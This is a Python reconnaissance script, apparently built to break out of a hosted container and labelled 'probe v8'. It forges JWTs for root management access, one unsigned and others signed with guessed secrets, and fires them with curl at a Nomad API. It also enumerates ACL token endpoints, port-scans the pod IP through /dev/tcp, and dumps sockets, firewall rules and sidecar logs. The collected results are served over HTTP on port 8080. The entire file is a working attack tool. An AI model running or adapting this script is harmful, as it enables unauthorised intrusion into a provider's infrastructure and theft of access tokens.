import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess
import base64

results = {}

def run_cmd(name, cmd, timeout=8):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

# 1. JWT attacks against Nomad
# Create various JWT tokens to try
def b64url(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

# alg: none token
none_header = b64url('{"alg":"none","typ":"JWT"}')
claims = b64url('{"sub":"root","policies":["management"],"type":"management","exp":9999999999}')
jwt_none = f"{none_header}.{claims}."

# HS256 with empty secret
import hmac, hashlib
hs256_header = b64url('{"alg":"HS256","typ":"JWT"}')
hs256_payload = b64url('{"sub":"root","policies":["management"],"type":"management","exp":9999999999}')
for secret in ['', 'secret', 'nomad', 'password', 'aiven', 'changeme']:
    sig_input = f"{hs256_header}.{hs256_payload}"
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), sig_input.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    jwt_hs256 = f"{sig_input}.{sig}"
    run_cmd(f"nomad_jwt_hs256_{secret or 'empty'}", 
        f"curl -sk -H 'X-Nomad-Token: {jwt_hs256}' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")

# alg none
run_cmd("nomad_jwt_none", 
    f"curl -sk -H 'X-Nomad-Token: {jwt_none}' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")

# Try different Nomad endpoints that might be less restricted
endpoints = [
    "/v1/status/leader",
    "/v1/status/peers",
    "/v1/agent/health",
    "/v1/agent/members",
    "/v1/system/gc",
    "/v1/operator/license",
    "/v1/namespaces",
    "/v1/acl/tokens",
    "/v1/acl/policies",
]
for ep in endpoints:
    run_cmd(f"nomad_ep_{ep.replace('/','_')}", 
        f"curl -sk https://169.254.1.2:4646{ep} 2>&1 | head -c 300")

# 2. Scan pod IP for Traefik
run_cmd("pod_ip", "ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")

# Get the actual pod IP and scan it
run_cmd("scan_pod_ip", """
POD_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
if [ -n "$POD_IP" ]; then
    echo "Pod IP: $POD_IP"
    for port in 80 443 8080 8443 27305 27000 28000 3000 4180 9090; do
        (echo > /dev/tcp/$POD_IP/$port) 2>/dev/null && echo "OPEN: $port"
    done
fi
""")

# 3. Check for Unix sockets
run_cmd("find_sockets", "find / -maxdepth 5 -type s 2>/dev/null | head -20")

# 4. Network listening details
run_cmd("ss_full", "ss -tlnp 2>/dev/null")
run_cmd("ss_all_socks", "ss -xlnp 2>/dev/null")

# 5. Read sidecar stderr for errors/config
run_cmd("sidecar_stderr", "cat /alloc/logs/sidecar.stderr.0 2>/dev/null | head -50")

# 6. iptables rules
run_cmd("iptables", "iptables -L -n 2>&1 | head -30")
run_cmd("ip6tables", "ip6tables -L -n 2>&1 | head -30")

# 7. Try Nomad via HTTPS on other ports
run_cmd("nomad_443", "curl -sk https://169.254.1.2:443/v1/agent/self 2>&1 | head -c 300")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v8 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
